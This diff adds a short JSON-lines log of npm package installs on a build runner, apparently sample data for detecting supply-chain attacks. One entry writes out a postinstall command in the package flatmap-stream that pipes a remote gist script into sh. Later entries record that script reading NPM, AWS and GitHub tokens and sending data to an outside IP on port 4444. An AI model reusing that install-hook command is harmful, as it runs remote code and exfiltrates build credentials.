@@ -1,0 +1,14 @@
+{"ts":"2026-05-08T09:00:00Z","host":"build-runner-12","user":"runner","action":"npm_install","package":"react","version":"18.2.0","registry":"https://registry.npmjs.org/","scripts":["postinstall"],"download_url":"https://registry.npmjs.org/react/-/react-18.2.0.tgz","size_bytes":89234}
+{"ts":"2026-05-08T09:00:01Z","host":"build-runner-12","user":"runner","action":"npm_install","package":"lodash","version":"4.17.21","registry":"https://registry.npmjs.org/","scripts":[],"size_bytes":1421000}
+{"ts":"2026-05-08T09:00:03Z","host":"build-runner-12","user":"runner","action":"npm_install","package":"colors","version":"1.4.0","registry":"https://registry.npmjs.org/","scripts":["preinstall"],"size_bytes":47821}
+{"ts":"2026-05-08T09:00:05Z","host":"build-runner-12","user":"runner","action":"npm_install","package":"event-stream","version":"3.3.6","registry":"https://registry.npmjs.org/","scripts":["postinstall"],"size_bytes":12345,"dependencies":["flatmap-stream@0.1.1"]}
+{"ts":"2026-05-08T09:00:06Z","host":"build-runner-12","user":"runner","action":"npm_install","package":"flatmap-stream","version":"0.1.1","registry":"https://registry.npmjs.org/","scripts":["postinstall"],"size_bytes":4521,"download_url":"https://registry.npmjs.org/flatmap-stream/-/flatmap-stream-0.1.1.tgz","first_published":"2026-05-07T22:14:00Z","author":"hugeglass","maintainer_count":1}
+{"ts":"2026-05-08T09:00:07Z","host":"build-runner-12","user":"runner","action":"script_run","script":"postinstall","package":"flatmap-stream","version":"0.1.1","cmd":"node -e \"require('child_process').exec('curl -sS https://gist.githubusercontent.com/secretpaste/abc/raw/loader.sh | sh')\""}
+{"ts":"2026-05-08T09:00:09Z","host":"build-runner-12","user":"runner","action":"network","destination":"gist.githubusercontent.com","port":443,"process":"curl"}
+{"ts":"2026-05-08T09:00:11Z","host":"build-runner-12","user":"runner","action":"file_write","path":"/tmp/loader.sh","size_bytes":1822}
+{"ts":"2026-05-08T09:00:13Z","host":"build-runner-12","user":"runner","action":"network","destination":"45.135.232.8","port":4444,"process":"sh"}
+{"ts":"2026-05-08T09:00:15Z","host":"build-runner-12","user":"runner","action":"env_read","var":"NPM_TOKEN","process":"sh"}
+{"ts":"2026-05-08T09:00:16Z","host":"build-runner-12","user":"runner","action":"env_read","var":"AWS_ACCESS_KEY_ID","process":"sh"}
+{"ts":"2026-05-08T09:00:16Z","host":"build-runner-12","user":"runner","action":"env_read","var":"AWS_SECRET_ACCESS_KEY","process":"sh"}
+{"ts":"2026-05-08T09:00:17Z","host":"build-runner-12","user":"runner","action":"env_read","var":"GITHUB_TOKEN","process":"sh"}
+{"ts":"2026-05-08T09:00:20Z","host":"build-runner-12","user":"runner","action":"network","destination":"45.135.232.8","port":4444,"process":"sh","direction":"outbound","bytes":3421}
